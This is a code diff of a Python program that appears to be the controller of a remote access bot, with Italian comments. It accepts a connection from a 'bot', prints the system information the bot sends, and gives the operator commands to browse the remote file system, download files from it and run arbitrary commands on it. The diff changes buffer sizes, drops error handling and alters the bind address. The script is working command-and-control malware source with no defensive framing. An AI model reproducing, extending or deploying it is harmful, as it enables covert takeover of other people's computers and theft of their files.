@@ -1,14 +1,10 @@
-import os
-# import sys
 from socket import *
 import threading
 import time
-import datetime
 
 checkConnectionPort = 23000
 serverPort = 6677
-# 0.0.0.0 default
-serverName = '0.0.0.0'
+serverName = 'localhost'          #0.0.0.0 default
 # Thread che periodicamente fa scambiare messaggi tra master e slave per controllare che non si sia disconnesso lo slave
 
 
@@ -17,15 +13,13 @@ def checkConnection():
     checkSocket.bind((serverName, checkConnectionPort))
     checkSocket.listen(1)
     checkSocketConnection, checkAddr = checkSocket.accept()
-    checkSocketConnection.settimeout(3)
+    checkSocket.settimeout(3)
     while True:
-        try:
-            checkSocketConnection.send('0'.encode())
-            checkSocketConnection.recv(1).decode()
-            time.sleep(2)
-        except Exception as e:
-            checkSocketConnection.close()
-            raise e
+        checkSocketConnection.send('0'.encode())
+        message = checkSocketConnection.recv(1).decode()
+        if message != '0':
+            raise Exception("Opps!!!")
+        time.sleep(5)
 
 
 while True:
@@ -41,25 +35,18 @@ while True:
         print('The server is ready to receive')
         connectionSocket, addr = serverSocket.accept()
         print('Accepted a new client', addr)
-        infoBot = connectionSocket.recv(8192).decode()
+        infoBot = connectionSocket.recv(4096).decode()
         print('Informazioni ottenute: \n', infoBot)
-        try:
-            file = open(str(datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')) + '.txt', 'w')
-            file.write(infoBot)
-            file.close()
-            print("Ho salvato il log in "+os.getcwd())
-        except Exception as e:
-            print(e)
         connectionSocket.send('ok'.encode())
         command = ''
         while command != 'exit':
-            print('Commands: ls, cd, get [file_name], cmd commands (on Windows systems)')
+            print('Commands: ls, cd, get [file_name], commands')
             command = input('Input a command:	')
-
+            print(command)
             if command == 'ls':
                 connectionSocket.send('ls'.encode())
-                ls = connectionSocket.recv(409600).decode()
-                cwd = connectionSocket.recv(409600).decode()
+                ls = connectionSocket.recv(1024).decode()
+                cwd = connectionSocket.recv(1024).decode()
                 print(ls)
                 print('Current working directory:	', cwd)
 
@@ -68,32 +55,26 @@ while True:
                 break
 
             if command.startswith('cd') and command[1:].strip():
-                if len(command) != 2:
-                    string = '1'+command.split(" ")[1]
-                    connectionSocket.send(string.encode())
-                    print('New path:	', connectionSocket.recv(90000000).decode())
+                string = '1'+command.split(" ")[1]
+                connectionSocket.send(string.encode())
+                print('New path:	', connectionSocket.recv(1024).decode())
 
-            if command.startswith('get') and len(command) > 3:
+            if command.startswith('get') and command[1:].strip():
                 string = '0'+command.split(" ")[1]
                 connectionSocket.send(string.encode())
-                msg = connectionSocket.recv(16).decode()
-                if msg == '1':
-                    data = connectionSocket.recv(90000000)
-                    file = open(string[1:], "wb")
-                    print("Receiving the file data.")
-                    file.write(data)
-                    file.close()
-                else:
-                    print("Syntax error (you probably selected a folder or protected file)")
+                data = connectionSocket.recv(90000000).decode()
+                file = open(string[1:], "w")
+                print("Receiving the file data.")
+                file.write(data)
+                file.close()
 
             if command != 'ls' and command != 'exit' and not command.startswith('cd') and not command.startswith('get'):
                 connectionSocket.send(command.encode())
                 out = connectionSocket.recv(1024).decode()
                 print(out)
-        print("Connessione chiusa")
+        #print("Connessione col socket persa") rimosso: perché scrivere che si è persa la connessione? Se si digita exit si esce dal while, quindi è una cosa voluta
         connectionSocket.close()
-        break
-    except Exception as e:
+    except:
         connectionSocket.close()
         print('Connection lost, retrying...')
         continue
